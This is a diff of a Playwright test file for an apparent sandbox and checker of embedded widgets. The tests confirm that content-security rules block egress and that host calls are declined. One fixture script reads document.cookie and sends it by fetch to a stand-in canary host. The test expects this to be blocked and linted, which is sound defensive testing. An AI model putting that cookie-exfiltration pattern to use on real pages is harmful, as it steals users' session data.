@@ -1,6 +1,12 @@
 import { expect, test } from "@playwright/test";
 import { cdpDriver, checkPage, playwrightDriver } from "../src/check/index.ts";
-import { GUIDE_EXAMPLES, presets, type PortholeConfig } from "../src/index.ts";
+import {
+  CAPABILITY_NAMES,
+  GUIDE_EXAMPLES,
+  presets,
+  type CapabilityMap,
+  type PortholeConfig,
+} from "../src/index.ts";
 
 /**
  * The agent's pre-show check (P073) in real browsers: the manual's own examples pass it under
@@ -8,14 +14,28 @@ import { GUIDE_EXAMPLES, presets, type PortholeConfig } from "../src/index.ts";
  * breaks is told so, briefly; the CDP driver (Cloudflare Browser Rendering's way) works too.
  */
 
+/** Every host function declared: each served by the check's declining handlers (P074). */
+const EVERY: CapabilityMap = Object.fromEntries(CAPABILITY_NAMES.map((name) => [name, {}]));
+const SERVED = {
+  isolation: "domain",
+  contentOrigins: ["https://*.example-usercontent.com"],
+} as const;
+
 const PRESETS: Record<string, PortholeConfig> = {
   inlineWidget: presets.inlineWidget(),
+  "inlineWidget, every host function": presets.inlineWidget({ capabilities: EVERY }),
+  "inlineWidget, served, every host function": presets.inlineWidget({
+    ...SERVED,
+    capabilities: EVERY,
+  }),
   artifact: presets.artifact(),
+  "artifact, served, every host function": presets.artifact({ ...SERVED, capabilities: EVERY }),
   "artifact, a whole-page viewer": presets.artifact({
     layout: { kind: "fill" },
     theme: { documents: "never" },
   }),
   mcpApp: presets.mcpApp(),
+  "mcpApp, every host function": presets.mcpApp({ capabilities: EVERY }),
 };
 
 const asDocument = (body: string) =>
@@ -100,6 +120,135 @@ test("the CDP driver runs the check over a DevTools session (Cloudflare Browser 
     expect(report.ok).toBe(false);
     expect(report.text).toContain("It threw: Error: over CDP");
     expect(report.runs[0]?.screenshot?.byteLength).toBeGreaterThan(100);
+  } finally {
+    await page.close();
+  }
+});
+
+const HOSTILE = `<!doctype html>
+<html><head><title>Hostile</title></head>
+<body>
+<p>A page that reads its cookie, then calls out</p>
+<script>
+const seen = document.cookie;
+fetch("https://porthole-canary.example/x?c=" + seen);
+localStorage.setItem("kept", "1");
+null.boom;
+</script>
+</body></html>`;
+
+test("a served config is checked served: its own origin, cookie and storage as people's browsers give them (P074)", async ({
+  browser,
+  browserName,
+}) => {
+  const served = presets.artifact({
+    isolation: "domain",
+    contentOrigins: ["https://*.example-usercontent.com"],
+  });
+  const report = await checkPage({
+    config: served,
+    content: HOSTILE,
+    driver: playwrightDriver(browser),
+    settleMs: 800,
+    widths: [400],
+    schemes: ["light"],
+  });
+  const run = report.runs[0];
+  // A served frame reads its cookie ("") and goes on: the fetch is what's blocked.
+  expect(run?.errors.join("\n")).not.toContain("SecurityError");
+  expect(run?.blocked).toContainEqual({
+    url: "https://porthole-canary.example/x?c=",
+    directive: "connect-src",
+  });
+  // Lines as written in the content, as the lint counts them. Each engine words the error its
+  // own way, and WebKit names no script in its errors (Chromium is the check's best engine).
+  expect(run?.errors).toContainEqual(
+    browserName === "chromium"
+      ? "TypeError: Cannot read properties of null (reading 'boom') (line 9)"
+      : browserName === "firefox"
+        ? 'TypeError: can\'t access property "boom" of null (line 9)'
+        : expect.stringMatching(/^TypeError: null is not an object \(evaluating 'null\.boom'\)/u),
+  );
+  expect(report.lint.find((each) => each.rule === "egress")?.line).toBe(7);
+});
+
+/** Calls on load: one that needs a click (the shell refuses it), two a person declines, one a handler answers. */
+const CALLS = `<p>Asks on load</p>
+<button onclick="sendPrompt('on click')">Ask</button>
+<script>
+sendPrompt("on load").then((sent) => { document.title = String(sent); });
+const ask = (id, method, params) => parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");
+ask(901, "resources/read", { uri: "ui://data/x" });
+ask(902, "tools/call", { name: "x", arguments: {} });
+ask(903, "ui/download-file", { contents: [{ type: "resource", resource: { uri: "file:///a.txt", text: "a" } }] });
+</script>`;
+
+for (const [mode, extra] of [
+  ["opaque", {}],
+  ["served", SERVED],
+] as const) {
+  test(`a widget with every host function runs in the check, ${mode}, its calls answered as a declining host would (P074)`, async ({
+    browser,
+  }) => {
+    const config = presets.inlineWidget({ ...extra, capabilities: EVERY });
+    const report = await checkPage({
+      config,
+      content: CALLS,
+      driver: playwrightDriver(browser),
+      settleMs: 800,
+      widths: [400],
+      schemes: ["light"],
+    });
+    const run = report.runs[0];
+    // The shell refuses a global's call without a click itself, as in people's browsers.
+    expect(run?.errors).toEqual([
+      expect.stringMatching(
+        /^Unhandled rejection: sendPrompt needs a click: call it from a button's handler/u,
+      ),
+    ]);
+    expect(run?.calls).toEqual(
+      expect.arrayContaining([
+        { capability: "readData", outcome: "answered" },
+        { capability: "callTool", outcome: "declined" },
+        { capability: "downloadFile", outcome: "declined" },
+      ]),
+    );
+    expect(report.ok).toBe(false);
+    expect(report.text).toContain("sendPrompt needs a click");
+    expect(report.text).toContain("Note: it called callTool at load; the check answered no");
+    expect(report.text).toContain("Note: it called readData at load; the check answered no");
+    // Calls a person may decline are notes, not problems.
+    const quiet = await checkPage({
+      config,
+      content: `<button onclick="sendPrompt('hi')">Ask</button>`,
+      driver: playwrightDriver(browser),
+      settleMs: 500,
+      widths: [400],
+      schemes: ["light"],
+    });
+    expect(quiet.ok, quiet.text).toBe(true);
+    expect(quiet.runs[0]?.calls).toEqual([]);
+  });
+}
+
+test("the CDP driver checks a served config served too", async ({ browser, browserName }) => {
+  test.skip(browserName !== "chromium", "CDP is Chromium's protocol");
+  const page = await browser.newPage();
+  try {
+    const report = await checkPage({
+      config: presets.inlineWidget({
+        isolation: "domain",
+        contentOrigins: ["https://*.example-usercontent.com"],
+      }),
+      content: "<p>w</p>\n<script>\nconst c = document.cookie;\nundefinedFn();\n</script>",
+      driver: cdpDriver(() => page.context().newCDPSession(page)),
+      settleMs: 700,
+      widths: [300],
+      schemes: ["dark"],
+    });
+    expect(report.runs[0]?.errors).toEqual([
+      expect.stringMatching(/^ReferenceError: .*undefinedFn.* \(line 4\)$/u),
+    ]);
   } finally {
     await page.close();
   }
